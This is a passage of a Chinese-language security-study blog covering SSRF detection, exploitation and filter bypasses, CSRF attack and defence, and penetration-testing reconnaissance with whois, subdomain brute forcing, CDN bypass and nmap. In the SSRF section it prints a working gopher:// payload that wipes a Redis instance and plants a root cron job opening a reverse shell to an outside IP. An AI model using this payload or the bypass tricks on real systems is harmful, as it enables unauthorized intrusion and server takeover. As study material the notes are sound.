title="漏洞验证方式"></a>漏洞验证方式</h4><ul><li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li><li>使用dnslog等工具进行测试，看是否被访问(可以再盲打后台，比如将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</li><li>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址：</li></ul><blockquote><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>通过二级域名暴力猜解工具模糊猜测内网地址</p><p>通过file协议读取内网信息获取相关地址</p></blockquote><ul><li>留意bool型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法</li><li>直接返回Banner、title、content等信息</li></ul><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等;</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等;</p><blockquote><p>http:192.168.64.144&#x2F;phpmyadmin&#x2F;<br>file:&#x2F;&#x2F;&#x2F;D:&#x2F;<a href="http://www.txt/">www.txt</a><br>dict:&#x2F;&#x2F;192.168.64.144:3306&#x2F;info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p></blockquote><p>7、本地利用和远程利用</p><p><a href="https://www.freebuf.com/articles/web/258449.html">ssrf知识点总结</a></p><h3 id="4、绕过方式"><a href="#4、绕过方式" class="headerlink" title="4、绕过方式"></a>4、绕过方式</h3><h4 id="绕过（http基本身份认证绕过）"><a href="#绕过（http基本身份认证绕过）" class="headerlink" title="@绕过（http基本身份认证绕过）"></a>@绕过（http基本身份认证绕过）</h4><p>使用前提：目标网站对访问的域名进行限制，且其本身存在ssrf漏洞时。</p><blockquote><p>url的完整格式为：</p><p>协议类型:&#x2F;&#x2F;访问资源需要的凭证信息@服务器地址:端口号&#x2F;资源层级UNIX文件路径（精确到文件名）?查询#片段ID</p></blockquote><p>因此！</p><blockquote><p>访问<code>&lt;a href=&quot;http://baidu.com@1.1.1.1&quot;&gt;</code>、<code>http://baidu.com@1.1.1.1</code></p><p>与</p><p>访问<code>http://1.1.1.1</code></p><p>其得到的效果是一样的。因为解析的本就是@后的服务器地址。</p><p>意思就是！比如，ssrf只允许访问百度：</p><p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com</code></p><p>我们的目标是绕过百度访问搜狗，可以使用@绕过：</p><p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com@www.sogou.com</code></p><p>注意：在对@解析域名中，不同的处理函数存在处理差异，比如在PHP的parse_url()中会识别<code>www.sogou.com</code>，而libcurl()则识别为<code>www.baidu.com</code>。</p></blockquote><h4 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h4><blockquote><p>顾名思义，就是使用<code>进制转换</code>来进行绕过嘛！将一些关键数字参数使用<code>二进制</code>、<code>八进制</code>、<code>十六进制</code>、<code>十进制整数格式</code>进行转换。</p><p>比如，IP地址 192.168.0.1 可以被改写为：</p><p>八进制格式：0300.0250.0.1</p><p>十六进制格式：0xC0.0xA8.0.1</p><p>十进制整数格式：3232235521（第一次听说这个哈哈哈）</p></blockquote><ul><li>————————————————————————</li></ul><p>IP地址的十进制整数格式计算方法：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png" alt="img"></p><ul><li>————————————————————————</li></ul><h4 id="用句号”。”替换-“-”"><a href="#用句号”。”替换-“-”" class="headerlink" title="用句号”。”替换 “.”"></a>用句号”。”替换 “.”</h4><blockquote><p>将IP地址中各个分隔部分的“.”号均分别使用“。”替代：</p><p>例：192.168.204.128 —-&gt; 192。168。204.128</p><p>但是执行过程中，右边的表达也会被解析为左边的表达。</p></blockquote><h4 id="xip-io-和-xip-name-绕过"><a href="#xip-io-和-xip-name-绕过" class="headerlink" title="xip.io 和 xip.name 绕过"></a>xip.io 和 xip.name 绕过</h4><p>使用前提：服务端没有先解析IP再过滤内网地址，就可以使用localhost等解析到内网的域名。（ xip.name在使用上与xip.io一致）</p><p>此外，如果php后端只使用parse_url函数中的host参数判断是否等于127.0.0.1，那么就可以使用<code>xip.io</code>、<code>nip.io</code>、<code>sslip.io</code>这些特殊网址进行绕过。</p><blockquote><p><code>xip.io</code>可以指向任意域名。所以可以将其与内网IP&#x2F;域名进行绑定，使其解析到内网。</p><p>例；<code>http://127.0.0.1.xip.io/1.php</code>实际上会解析到<code>http://127.0.0.1/1.php</code></p></blockquote><h4 id="添加端口号"><a href="#添加端口号" class="headerlink" title="添加端口号"></a>添加端口号</h4><p>有些网站可能会限制子网段。因此可以在URL中目标IP地址后面使用冒号“:”添加服务端口号，常用的是，添加<code>：80</code>端口绕过。</p><h4 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h4><p>利用<code>[::]</code>来实现绕过。<code>http://[::]:80/</code>会解析为<code>http://127.0.0.1</code></p><h4 id="DNS-重绑（Rebinding）"><a href="#DNS-重绑（Rebinding）" class="headerlink" title="DNS 重绑（Rebinding）"></a>DNS 重绑（Rebinding）</h4><p>工具网站：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><a href="https://blog.csdn.net/qq_36348899/article/details/119297854">[DNS安全] 详解DNS重绑定攻击</a></p><blockquote><p>重绑逻辑：</p><p>1、判定你给的 IP 或者域名解析后的 IP 是否在黑名单中</p><p>2、若在，退出报错</p><p>3、若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p><p>实现效果：</p><p>拥有一个域名，其映射到两个IP。同时设置 TTL 为 0，方便两个 IP 切换。</p><p>效果类比：你访问wwfcww.xyz这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。</p></blockquote><h4 id="非HTTP协议绕过"><a href="#非HTTP协议绕过" class="headerlink" title="非HTTP协议绕过"></a>非HTTP协议绕过</h4><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过<code>gopher</code>，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p><p> 例，使用gopher协议对与内网的Redis服务进行攻击，可使用如下url：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1%0d%0a<span class="hljs-variable">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$16</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0aquit%0d%0a<br></code></pre></td></tr></table></figure><p>前面讲漏洞利用的时候提到过协议渗透。请回去复习。</p><h3 id="5、漏洞防御"><a href="#5、漏洞防御" class="headerlink" title="5、漏洞防御"></a>5、漏洞防御</h3><blockquote><p>1、在内网设备上建立黑名单内网IP，禁止公开服务器的访问。</p><p>2、过滤返回信息，对响应用户请求的返回信息进行验证。</p><p>3、禁用端口banner信息。</p><p>4、禁用不必要的协议，防止file协议等。</p><p>5、根据业务需求设定URL格式。防止攻击者构建攻击语句6、统一错误信息，避免攻击者根据错误信息判断端口状态7、限制请求端口。</p></blockquote><h2 id="④CSRF跨站请求伪造"><a href="#④CSRF跨站请求伪造" class="headerlink" title="④CSRF跨站请求伪造"></a>④CSRF跨站请求伪造</h2><h3 id="1、漏洞简介-2"><a href="#1、漏洞简介-2" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h3><p>· csrf（xsrf），跨站请求伪造，也被称为one-click attack 或 session riding。是一种<code>挟持用户在当前已登录的web应用程序上执行非本意操作</code>的攻击方法。</p><p>· <strong>原理</strong>：黑客利用已登陆的用户，<code>诱使其访问或登陆某个早已构造好的恶意链接或页面</code>，然后在<code>用户毫不知情</code>的情况下，<code>以用户的名义完成了非用户本意的非法操作</code>。</p><p>· <strong>实现的效果</strong>：csrf跨站请求伪造的实现效果，可以理解为攻击者盗用了合法用户的身份，以其名义在恶意网站发送恶意请求，合法用户发起的恶意请求对服务器来说是合法的。</p><p>· <strong>与XSS跨站脚本攻击相比</strong>：</p><blockquote><p>XSS利用的是用户对指定网站的信任（攻击者预先将恶意代码插入网站网页中）</p><p>CSRF利用的是网站对用户网页浏览器的信任。（攻击者诱使用户点击恶意链接或页面进而向服务器发送恶意请求）</p><p>注意！</p><p>CSRF攻击中，攻击者并没有拿到用户的权限。是借用户的权限完成了攻击（“借刀杀人”）</p><p>而XSS攻击中，攻击者可以通过盗取cookie来获取用户权限进而完成破坏。（“侵占”）</p></blockquote><p>· <strong>攻击细节</strong>：</p><p>csrf（跨站请求攻击）简单来说，就是攻击者通过一些技术手段<code>欺骗</code>用户的浏览器去访问一个用户<code>曾经认证过的网站</code>并运行一些操作（如发邮件、发信息、财产操作如转账或购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p><p>攻击过程中利用了web中用户身份验证的漏洞：<code>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</code>。</p><p>典型示例：tom登陆了银行网站且没有退出，此时浏览器中包含着tom在银行的身份验证信息 —-  攻击者将伪造的转账请求包含在帖子中，并发送给tom —-  tom在银行网站保持登陆的情况下浏览帖子 —-  即会将伪造的转账请求连同身份的认证信息发送到银行网站 —-  银行网站看到身份认证信息，认为请求是tom的合法操作。</p><p>· <strong>原理总结</strong>：</p><blockquote><p>一个CSRF漏洞攻击的实现，其需要由‘几个部分’来构成：</p><p>1、首先，需要有一个漏洞存在（无需验证、任意修改后台数据、新增请求）</p><p>2、伪装数据操作请求的恶意链接或页面</p><p>3、诱使用户主动访问或登陆恶意链接，触发非法操作</p></blockquote><h3 id="2、漏洞检测"><a href="#2、漏洞检测" class="headerlink" title="2、漏洞检测"></a>2、漏洞检测</h3><ul><li><p>方法一：抓取一个正常请求的数据包，去掉referer字段后再重新提交，如果该提交还是有效的，那么基本上可以确认目标网站存在csrf漏洞。</p></li><li><p>方法二：使用专门针对csrf漏洞检测的工具进行检测，如CSRFTester，CSRF Request Builder 等。</p></li></ul><blockquote><p>CSRFTester漏洞检测工具的测试原理：首先需要抓取我们在浏览器中访问过的所有链接以及所有表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这部操作相当于伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞。</p><p>（所以这些检测工具也可以被用来执行CSRF攻击！）</p></blockquote><h3 id="3、漏洞利用-1"><a href="#3、漏洞利用-1" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h3><p><a href="https://blog.csdn.net/wudideaqing/article/details/139678044">CSRF(跨站请求伪造)漏洞 (带靶场演示+漏洞挖掘）</a></p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>有以下五种：</p><blockquote><ul><li>链接点击：</li></ul><p>攻击者通过邮件、社交媒体或其它方式发送包含恶意请求的链接，并诱导用户点击。</p><ul><li>隐藏表单</li></ul><p>在恶意网站上嵌入隐藏的表单，诱导用户在不知情的情况下触发表单提交。</p><ul><li>自动提交表单</li></ul><p>在恶意网站上使用javascript自动提交包含恶意请求的表单。如，编写响应功能的POC。</p><ul><li>图像加载</li></ul><p>在恶意网站嵌入图像标签，图像URL指向目标网站的恶意请求。</p><ul><li>跨域请求</li></ul><p>利用XMLHttpRequest或Fetch API发送跨域请求。（但是这通常会被浏览器中的同源策略和CORS限制）</p><p>CORS：跨源资源共享机制。用于定义在一个域中加载的客户端web应用程序与另一个域中的资源交互方式。</p></blockquote><h3 id="4、漏洞防御"><a href="#4、漏洞防御" class="headerlink" title="4、漏洞防御"></a>4、漏洞防御</h3><ul><li><strong>检查Referer字段</strong></li></ul><p>在HTTP协议头中有一个字段叫做Referer，它记录了该HTTP请求的来源地址。在处理敏感数据请求时，Referer字段（<code>不会骗人的真实请求地址</code>）应该要和请求的地址（<code>对方声称的请求地址</code>）处于同一个域名下。</p><p>但是该由于Referer的值是由浏览器提供的，每个浏览器对于Referer字段的具体实现存在差别，因此，并不能保证浏览器自身并没有安全漏洞。</p><p><a href="https://blog.csdn.net/SongSir001/article/details/98182051">CSRF（跨站请求伪造） 漏洞与预防-有预防代码实现</a></p><ul><li><strong>在请求地址中添加token并验证</strong></li></ul><p>CSRF攻击成功的原因是：因为攻击者能够<code>伪造用户的请求</code>，且该请求中所有的用户验证信息<code>都存在于cookie</code>中，因此攻击者可以在无需知道用户验证信息的情况下直接利用用户自己的cookie来通过安全验证。</p><p>所以！抵御CSRF攻击的关键在于：<code>在请求中放入一些攻击者不能伪造的信息，并且该信息不存在于cookie当中</code>。</p><p>所以，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在该服务器上建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。（这个防御手法一般是开发人员做）</p><ul><li><strong>当前用户密码验证</strong></li></ul><p>在修改关键信息时，要求当前用户输入其自身的密码，以验证当前用户身份的真伪，进而防止未授权的恶意操作。</p><ul><li><strong>SameSite Cookie 属性</strong></li></ul><p>设置 Cookie 的 SameSite 属性为 Strict 或 Lax，防止跨站请求携带 Cookie。</p><ul><li><strong>定期重置 Session ID</strong></li></ul><p>降低会话被劫持的风险，确保会话令牌的安全性。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试（一）</title>
    <link href="/2024/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="1-渗透测试"><a href="#1-渗透测试" class="headerlink" title="1.渗透测试"></a>1.渗透测试</h1><p><a href="https://blog.csdn.net/lady_killer9/article/details/106791542">网络安全-自学笔记</a></p><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="①流程"><a href="#①流程" class="headerlink" title="①流程"></a>①流程</h3><blockquote><p>前期交互</p><p>信息收集</p><p>威胁建模</p><p>漏洞分析</p><p>渗透攻击</p><p>后渗透攻击</p><p>报告</p></blockquote><h3 id="②测试方法"><a href="#②测试方法" class="headerlink" title="②测试方法"></a>②测试方法</h3><blockquote><p>白盒测试：基本从内部发起，通过正常渠道向被测单位获取资料。</p><p>黑盒测试：在授权的情况下，模拟黑客的攻击方法和思维方式，评估安全风险。黑盒测试不同于黑客入侵。</p></blockquote><h2 id="前期交互"><a href="#前期交互" class="headerlink" title="前期交互"></a>前期交互</h2><p>目标：</p><ul><li>确定范围：测试目标的范围、ip、域名、内外网、测试账户。</li><li>确定规则：能渗透到什么程度，所需要的时间，能够执行修改上传，能否提权等。</li><li>确定需求：web应用的漏洞，业务逻辑漏洞，人员权限管理漏洞等。</li></ul><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要收集服务器的配置信息和网站的敏感信息，其中包括：</p><ul><li>域名以及子域名信息</li><li>目标网站系统</li><li>cms指纹</li><li>目标网站真实IP</li><li>开放的端口等。</li></ul><p>信息收集的方式可分为<code>主动</code>和<code>被动</code>两种。</p><p><code>主动信息收集</code>：与目标主机进行直接交互，从而拿到目标信息。（比如黑进目标主机）</p><p><code>被动信息收集</code>：间接交互，通过搜索引擎或社会工程等方式间接获取目标主机上的信息。（比如Google搜索、Shodan搜索等）</p><h3 id="①域名信息的收集"><a href="#①域名信息的收集" class="headerlink" title="①域名信息的收集"></a>①域名信息的收集</h3><p>确定了要渗透的目标，即确定了其域名。</p><p>确定了域名之后还需要确定域名对应的<code>IP地址</code>，域名的<code>whois</code>信息、<code>子域名</code>等一系列与域名相关的信息。</p><h4 id="1、域名的whois信息"><a href="#1、域名的whois信息" class="headerlink" title="1、域名的whois信息"></a>1、域名的whois信息</h4><p><code>whois</code>是用来查询域名的<code>IP地址</code>以及所有者等信息的传输协议。</p><p>通常，执行whois查询的工具是：</p><p><a href="https://www.zhanid.com/tool/whois.html">whois查询工具—站长工具网</a></p><p><a href="https://tools.wujingquan.com/whois/">whois信息查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707164136300.png" alt="image-20240707164136300"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240707165721514.png" alt="image-20240707165721514"></p><p>其它的注入阿里云的域名查询在线工具也可以，就是显示出来的信息没有那么集中。</p><p>在kali下，也有默认的<code>whois工具指令</code>。</p><p>查询命令为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">whois 域名（.com）<br></code></pre></td></tr></table></figure><h4 id="2、备案信息查询"><a href="#2、备案信息查询" class="headerlink" title="2、备案信息查询"></a>2、备案信息查询</h4><p>ICP备案信息查询。</p><p>查询网址：</p><p><a href="https://icp.chinaz.com/">ICP备案查询-站长工具</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134232544.png" alt="image-20240709134232544"></p><p><a href="https://beian.miit.gov.cn/#/Integrated/index">工信部ICP备案查询</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709134434241.png" alt="image-20240709134434241"></p><p>可以从中得到一些有关于网址或者域名的一些备案号、主办单位、网站负责人之类的信息。</p><h4 id="3、子域名信息"><a href="#3、子域名信息" class="headerlink" title="3、子域名信息"></a>3、子域名信息</h4><p>查询子域名的几种方法如下：</p><ul><li>Layer子域名爆破机</li></ul><p>Layer是win下的一款子域名探测工具，其工作原理是：利用<code>子域名字典</code>进行爆破。</p><p>输入目标网站的域名即可启动进行字典爆破子域名。如下是访问gxu官网域名爆破得到的子域名结果。</p><p>工具地址：<code>E:\IDEToolsV2\Layer子域名挖掘机4.2纪念版</code></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709135535182.png" alt="image-20240709135535182"></p><ul><li>subDomainsBurte</li></ul><p>它同样也是一个子域名爆破工具，使用<code>字典暴力</code>破解，并通过<code>DNS解析</code>来确定是否存在有效的子域名。它的特点是可以用小字典递归地发现三级域名、四级域名、甚至是五级域名等不容易被探测到的域名。</p><p>工具下载链接： <a href="https://github.com/lijiejie/subDomainsBrute%EF%BC%88%E5%8F%AF%E4%BD%BF%E7%94%A8pip%E5%AE%89%E8%A3%85%EF%BC%89">https://github.com/lijiejie/subDomainsBrute（可使用pip安装）</a></p><p>也可以在kali下安装使用哦。</p><p>使用默认下载源的话可能速度较慢而且可能会失败，所以我们可以使用镜像源下载。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple dnspython==2.2.1 async_timeout<br></code></pre></td></tr></table></figure><p>在kali主机内部暂时下载失败。</p><p>通过远程连接下载也是失败：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142722978.png" alt="image-20240709142722978"></p><p>由错误信息可以略知一二，kali系统中本来就有<code>dnspython</code>，所以试图再次下载的时候就会报错。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709142938308.png" alt="image-20240709142938308"></p><p>所以就直接先下载那个GitHub文件。</p><p><a href="https://blog.csdn.net/m0_57206390/article/details/133201540">kali 安装使用subDomainsBrute</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/lijiejie/subDomainsBrute.git<br></code></pre></td></tr></table></figure><p>这里远程终端下载一直发生错误，在kali内部尝试访问浏览器，也不行，然后更改了代理设置为使用系统自定义的代理，但是在远程终端还是不行。去到kali本机访问目标链接，发现可以访问到，然后直接在里边下载了。成功了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150649237.png" alt="image-20240709150649237"></p><p>进入到目标文件夹安装依赖包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install dnspython gevent<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709150903081.png" alt="image-20240709150903081"></p><p>启动方式为：进入到<code>subDomainsBrute</code>文件夹下，执行启动代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 subDomainsBrute.py gxu.edu.com（域名）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151237123.png" alt="image-20240709151237123"></p><p>爆破速度远比Layer慢。</p><ul><li>Google查询</li></ul><p>使用语法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">site:域名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709151514907.png" alt="image-20240709151514907"></p><p>本来也可以使用<code>FOFA</code>的，但是它并不是免费使用哈哈。</p><h4 id="4、http证书查询"><a href="#4、http证书查询" class="headerlink" title="4、http证书查询"></a>4、http证书查询</h4><p><a href="https://crt.sh/">http证书查询</a></p><p>可以输入域名，查询与其绑定的相关证书信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152136780.png" alt="image-20240709152136780"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709152056475.png" alt="image-20240709152056475"></p><h4 id="5、DNS记录查询"><a href="#5、DNS记录查询" class="headerlink" title="5、DNS记录查询"></a>5、DNS记录查询</h4><p>DNS指的是域名解析服务，即将域名与IP之间做相应的转换。</p><blockquote><p>正向解析：根据域名查找对应的IP地址</p><p>反向解析：根据IP地址查找对应的域名</p></blockquote><ul><li><p>kali工具（DNSenum、Fierce、DMitry）</p></li><li><p>在线查询工具：</p><p><a href="http://tool.chinaz.com/dns/">站长工具之DNS查询</a></p><p>查询的效果是这样的：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154255324.png" alt="image-20240709154255324"></p><p><a href="https://www.virustotal.com/gui/home/search">国外的DNS查询工具</a></p><p>界面良好直观，而且经过测试应该也是免费的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709154740043.png" alt="image-20240709154740043"></p></li></ul><h4 id="6、判断域名对应的IP地址"><a href="#6、判断域名对应的IP地址" class="headerlink" title="6、判断域名对应的IP地址"></a>6、判断域名对应的IP地址</h4><p>首先需要判断域名是否存在CDN的情况。可以先去在线CDN查询网站进行查询。</p><p><a href="https://ping.chinaz.com/">在线CDN查询</a></p><p>如果输入域名查询得到的IP地址不止一个的话，那就说明该IP地址不是真实的服务器地址。<code>如果是两个或者三个IP地址，并且这些IP地址是同一个地区不同运营商的话，则这些IP地址很有可能是服务器的出口地址，该服务器在内网中</code></p><p>现在下面查询的这个域名，他只有一个对应的IP地址，说明该IP地址就是该域名的真实服务器地址，不存在CDN的情况。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709161318682.png" alt="image-20240709161318682"></p><p>如何绕过CDN查找网站的真实IP呢？</p><ul><li><p>很多时候一些重要的站点会做CDN，但是它旗下的一些子域名站点不会做CDN。可以从子域名切入查找网站的真实IP。<code>启动终端，在终端中使用ping命令。执行 ping 子域名 的命令，ping返回结果中会返回该子域名的IP地址</code>。 </p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709162401797.png" alt="image-20240709162401797"></p></li></ul><blockquote><p>CDN（内容分发网络）是构建在现有互联网基础之上的一层智能虚拟网络。</p></blockquote><h3 id="②整站分析"><a href="#②整站分析" class="headerlink" title="②整站分析"></a>②整站分析</h3><p>分析的对象有：</p><ul><li><p>服务器类型：windows、linux</p><blockquote><p>ping探测：win的TLS值一般是128，linux的则一般是64。</p><p>nmap扫描：<code>namp -O/-A IP地址</code>一般都能扫描得出来。</p></blockquote></li><li><p>网站容器：apache、nginx、tomcat、IIS等</p></li><li><p>脚本类型：php、jsp、asp、aspx</p></li><li><p>数据库类型：mysql、oracle、access、sqlserver</p></li></ul><p>在之前进行靶场攻打的过程中，有关于分析网站技术构成的指纹工具（如wappalyzer）就很适合用于整站分析（网站容器、脚本类型、数据库类型）。</p><p><strong>几种数据库的区别：</strong></p><blockquote><ul><li>Access：小型数据库，数据库后缀名：.mdb。一般是asp网页文件使用这个数据库</li><li>SQL Server：比较大型的数据库，端口号为1433，数据库后缀名：.mdf</li><li>MySQL：大部分是PHP页面，默认端口号是3306</li><li>Oracle：常用于比较大型的网站，默认端口是1521</li></ul></blockquote><p>常见搭配：</p><p>asp、aspx：access、sqlserver</p><p>php：mysql、postgreSQL</p><p>jsp：Oracle、mysql</p><h3 id="③企业信息查询"><a href="#③企业信息查询" class="headerlink" title="③企业信息查询"></a>③企业信息查询</h3><p>确认了公司之后，可以去互联网上查询与该公司有关的任何信息。如：企业基本信息、员工信息（手机号、邮箱、姓名、社交账号信息等）、组织框架、企业法人、企业综合信息等。使用社会工程学攻击获取这些信息也不是不行（在合法报备情况下哈）。</p><p><a href="https://www.tianyancha.com/">天眼查</a></p><p><a href="https://www.qcc.com/">企查查</a></p><p>也可以通过之前得ICP备案查询去获取一些信息。</p><h3 id="④GitHub信息收集"><a href="#④GitHub信息收集" class="headerlink" title="④GitHub信息收集"></a>④GitHub信息收集</h3><p>亲测，做毕设的时候在GitHub上找项目，找到了一个包含一万七条的员工入职个人信息。确实有这个必要进行GitHub信息收集。</p><p>主要收集：泄露源码、泄露数据库&#x2F;邮箱&#x2F;ftp&#x2F;ssh&#x2F;3389等账号、泄露的人员信息以及其它敏感信息。</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">信息收集之Github搜索语法</a></p><h3 id="⑤端口扫描"><a href="#⑤端口扫描" class="headerlink" title="⑤端口扫描"></a>⑤端口扫描</h3><h4 id="1、nmap端口扫描"><a href="#1、nmap端口扫描" class="headerlink" title="1、nmap端口扫描"></a>1、nmap端口扫描</h4><ul><li><p>功能：主机发现（检测存活在网络上的主机）、端口发现（检测开放端口）、服务发现（检测端口开放的服务和其版本）、检测操作系统&#x2F;硬件地址&#x2F;软件版本等、检测脆弱性漏洞（<code>--script=vuln</code>）</p></li><li><p>常用命令：</p></li></ul><blockquote><p>-sS：tcp syn扫描</p><p>-p：指定端口号扫描</p><p>-v：显示扫描过程</p><p>-F：快速扫描</p><p>-A：全面扫描</p><p>-Pn：禁止ping后扫描，跳过主机发现的过程进行端口扫描</p><p>-sU：udp扫描</p><p>-sT：tcp扫描</p><p>-sV：扫描系统版本和程序版本号检测</p><p>-n：禁止反向域名解析</p><p>-R：启用反向域名解析</p><p>-6：启用IPV6扫描</p><p>–script&#x3D;vuln：全面的漏洞扫描</p></blockquote><h4 id="2、旁站和c段扫描"><a href="#2、旁站和c段扫描" class="headerlink" title="2、旁站和c段扫描"></a>2、旁站和c段扫描</h4><p>旁站是指和目标网站在同一台服务器上的其它网站。拿webshell，提权，拿下该网站。</p><p>使用IP反查域名搜索旁站：</p><p><a href="http://s.tool.chinaz.com/same">IP反查域名</a></p><p><a href="https://www.aizhan.com/">SEO综合查询·反查域名</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240709230713348.png" alt="image-20240709230713348"></p><p>对红蓝对抗和护网，c段扫描比较有意义。c段是指与目标服务器IP处于同一个C段的其它服务器。（192.168.1.0&#x2F;24）</p><h3 id="⑥网站敏感目录和文件"><a href="#⑥网站敏感目录和文件" class="headerlink" 